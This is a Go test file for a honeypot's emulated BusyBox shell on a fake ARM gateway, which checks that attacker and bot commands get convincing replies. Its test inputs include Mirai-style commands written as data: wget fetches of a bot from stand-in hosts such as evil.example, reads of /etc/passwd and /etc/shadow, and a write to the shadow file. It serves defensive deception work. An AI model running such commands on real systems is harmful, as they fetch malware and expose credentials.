package vfs

import (
	"path"
	"strings"
	"testing"
	"time"
)

// Each row = a line sent by the attacker + what must appear on screen.
func TestRun(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"whoami", "root\n"},
		{"uname -m", "armv7l\n"},
		{"cd /tmp; pwd", "/tmp\n"},
		{"cd /tmp/../etc && pwd", "/etc\n"},
		{"cd /missing || cd /var/run; pwd", "-sh: cd: can't cd to /missing: No such file or directory\n/var/run\n"},
		{"cd /missing 2>/dev/null || cd /var/run; pwd", "/var/run\n"},
		{"cat /etc/passwd | grep admin", "admin:x:0:0:admin:/root:/bin/ash\n"}, // admin has uid 0 (still root)
		{"cat /proc/cpuinfo | grep 'model name'", "model name\t: ARMv7 Processor rev 5 (v7l)\n"},
		{`echo -e '\x6b\x61\x6d\x69'`, "kami\n"},
		{`echo "a; b" && echo c`, "a; b\nc\n"},
		{"echo -n done", "done"},
		{"/bin/busybox ECCHI", "ECCHI: applet not found\n"},
		{"busybox echo hello", "hello\n"},
		{"wget http://evil.example/bot && echo never-printed", "wget: can't connect to remote host: Connection timed out\n"},
		{"ls /var", "log  run  tmp\n"},
		{"cd /tmp; touch a; mkdir b; ls", "a  b\n"},
		{"echo kami > /tmp/.x; cat /tmp/.x; rm /tmp/.x; cat /tmp/.x", "kami\ncat: can't open '/tmp/.x': No such file or directory\n"},
		{"echo one > f; echo two >> f; cat f", "one\ntwo\n"},
		{"echo hi > /missing/file", "-sh: can't create /missing/file: nonexistent directory\n"},
		{"cd /tmp; wget http://x/bot -O - > bot; cat bot; ls", "wget: can't connect to remote host: Connection timed out\nbot\n"},
		{"cat /missing > f 2>/dev/null; ls", "f\n"},
		{"cat /tmp", "cat: read error: Is a directory\n"},
		{"./bot", "-sh: ./bot: not found\n"},
		{"cd /tmp; cp /bin/busybox x; ./x && echo started", "started\n"},
		{"ls /etc", "hostname     hosts        passwd       resolv.conf  shadow\n"}, // columns as wide as the longest name + 2
		{"cat /bin/echo", elfHeader},                                                // a link to busybox: Mirai reads the ELF header through it
		{"/usr/bin/wget http://x/bot", "wget: can't connect to remote host: Connection timed out\n"},
		{"cd /bin; ./ls /var", "log  run  tmp\n"},
		{"/sbin/init", "init: must be run as PID 1\n"},
		{"cat /var/run/dropbear.pid", "341\n"},
		{"cat /proc/meminfo | grep MemTotal", "MemTotal:         124520 kB\n"},
		{"", ""},
		{";;", ""},
	}

	for _, tt := range tests {
		got, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// exit ends the session: nothing after it runs.
func TestExit(t *testing.T) {
	out, exit := NewShell().Run("echo bye; exit; echo never-printed")
	if out != "bye\n" || !exit {
		t.Errorf("got %q, exit=%v", out, exit)
	}
}

// The prompt follows the current directory.
func TestPrompt(t *testing.T) {
	sh := NewShell()
	if p := sh.Prompt(); p != "root@gateway:~# " {
		t.Errorf("prompt at start: %q", p)
	}
	sh.Run("cd /tmp")
	if p := sh.Prompt(); p != "root@gateway:/tmp# " {
		t.Errorf("prompt after cd /tmp: %q", p)
	}
}

// Two attackers must not see each other's files or current directory.
func TestSessionsAreSeparate(t *testing.T) {
	a := NewShell()
	b := NewShell()
	a.Run("cd /tmp; echo secret > x")

	if out, _ := b.Run("cat /tmp/x"); out != "cat: can't open '/tmp/x': No such file or directory\n" {
		t.Errorf("b sees a's file: %q", out)
	}
	if out, _ := b.Run("pwd"); out != "/root\n" {
		t.Errorf("b has a's directory: %q", out)
	}
}

// fixedClock makes the ls -l dates predictable: "now" is Nov 20 2026 10:30, the boot was 2 days before.
func fixedClock(t *testing.T) {
	oldNow, oldBoot := now, bootTime
	now = func() time.Time { return time.Date(2026, time.November, 20, 10, 30, 0, 0, time.UTC) }
	bootTime = time.Date(2026, time.November, 18, 9, 15, 0, 0, time.UTC)
	t.Cleanup(func() { now, bootTime = oldNow, oldBoot })
}

// ls like BusyBox 1.30: columns, hidden files, several targets and the -l line
// ("%-10s %4d %-8s %-8s %9s" + date + name, the same printf as in BusyBox's ls.c).
func TestLs(t *testing.T) {
	fixedClock(t)
	const nippon = "cd /tmp; echo kami > .nippon; mkdir d; " // a bot's hidden file + a directory
	tests := []struct{ line, want string }{
		{"ls /", "bin   dev   etc   lib   mnt   proc  root  sbin  sys   tmp   usr   var\n"},
		{"ls -1 /var", "log\nrun\ntmp\n"},
		{"ls --color=auto /var", "log  run  tmp\n"},
		{"ls /nope /etc/hostname", "ls: /nope: No such file or directory\n/etc/hostname\n"},
		{"ls /var/run /etc/hostname", "/etc/hostname\n\n/var/run:\ndropbear.pid\n"},
		{"ls /var/run /var/log", "/var/log:\nmessages\n\n/var/run:\ndropbear.pid\n"},

		// hidden files (.x) only with -a or -A, or when named
		{nippon + "ls", "d\n"},
		{nippon + "ls -a", ".        ..       .nippon  d\n"},
		{nippon + "ls -A", ".nippon  d\n"},
		{nippon + "ls .nippon", ".nippon\n"},

		// -l: firmware files from 2020 (older than 6 months -> year), /tmp /var /dev /proc from boot,
		// the attacker's files from "now"
		{"ls -la", "drwxr-xr-x    2 root     root            40 Jun  4  2020 .\n" +
			"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n"},
		{"ls -l /var/run", "-rw-r--r--    1 root     root             4 Nov 18 09:15 dropbear.pid\n"},
		{"ls -l /bin/sh /bin/busybox /dev/null",
			"-rwxr-xr-x    1 root     root        278412 Jun  4  2020 /bin/busybox\n" +
				"lrwxrwxrwx    1 root     root             7 Jun  4  2020 /bin/sh -> busybox\n" +
				"crw-rw-rw-    1 root     root        1,   3 Nov 18 09:15 /dev/null\n"},
		{"ls -l /usr/bin/wget /proc/cpuinfo",
			"-r--r--r--    1 root     root             0 Nov 18 09:15 /proc/cpuinfo\n" +
				"lrwxrwxrwx    1 root     root            17 Jun  4  2020 /usr/bin/wget -> ../../bin/busybox\n"},
		{"ls -ld /tmp /proc",
			"dr-xr-xr-x    2 root     root             0 Nov 18 09:15 /proc\n" +
				"drwxrwxrwt    2 root     root            40 Nov 18 09:15 /tmp\n"},
		{nippon + "ls -la",
			"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
				"drwxr-xr-x   14 root     root           280 Jun  4  2020 ..\n" +
				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
			"-rw-------    1 root     root           290 Nov 20 10:30 /etc/shadow\n"},
	}
	for _, tt := range tests {
		got, _ := NewShell().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Columns go top to bottom, then left to right, each as wide as the longest name + 2 (BusyBox).
func TestColumns(t *testing.T) {
	names := []string{"ash", "busybox", "cat", "chmod", "cp", "echo", "false", "grep", "hostname", "kill",
		"login", "ls", "mkdir", "mv", "ps", "pwd", "rm", "sh", "sleep", "touch", "true", "uname"}
	want := "ash       cp        hostname  mkdir     rm        true\n" +
		"busybox   echo      kill      mv        sh        uname\n" +
		"cat       false     login     ps        sleep\n" +
		"chmod     grep      ls        pwd       touch\n"
	if got := columns(names); got != want {
		t.Errorf("columns:\n%s\nwant:\n%s", got, want)
	}

	long := strings.Repeat("x", 80) // wider than the terminal -> one name per line
	if got := columns([]string{long, "y"}); got != long+"\ny\n" {
		t.Errorf("a name wider than the terminal: %q", got)
	}
}

// Every applet link must work as a command: an "ls /bin" entry that answers "not found" gives us away.
func TestAppletsAreImplemented(t *testing.T) {
	for p, target := range fakeLinks {
		if path.Base(target) != "busybox" {
			continue // the C library links
		}
		if out, code, _ := NewShell().command([]string{p}, ""); code == 127 {
			t.Errorf("%s -> %s is listed but not implemented: %q", p, target, out)
		}
	}
}

// Every path ps shows (programs, the pid file, /bin/login) must exist: an attacker can ls -l it.
func TestPsMatchesFiles(t *testing.T) {
	sh := NewShell()
	for _, line := range strings.Split(fakePS, "\n") {
		fields := strings.Fields(line)
		for _, f := range fields[min(4, len(fields)):] { // the COMMAND column and its arguments
			if _, ok := sh.readFile(f); strings.HasPrefix(f, "/") && !ok {
				t.Errorf("ps shows %s, which does not exist", f)
			}
		}
	}
}

// /proc/meminfo in the kernel's format: "Name:" padded to 16, the value in 8 columns, " kB".
func TestMeminfo(t *testing.T) {
	out, _ := NewShell().Run("cat /proc/meminfo")
	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) < 30 || lines[0] != "MemTotal:         124520 kB" {
		t.Fatalf("%d lines, the first %q", len(lines), lines[0])
	}
	for _, l := range lines {
		if len(l) != 27 || !strings.HasSuffix(l, " kB") {
			t.Errorf("not in the kernel's format: %q", l)
		}
	}
}
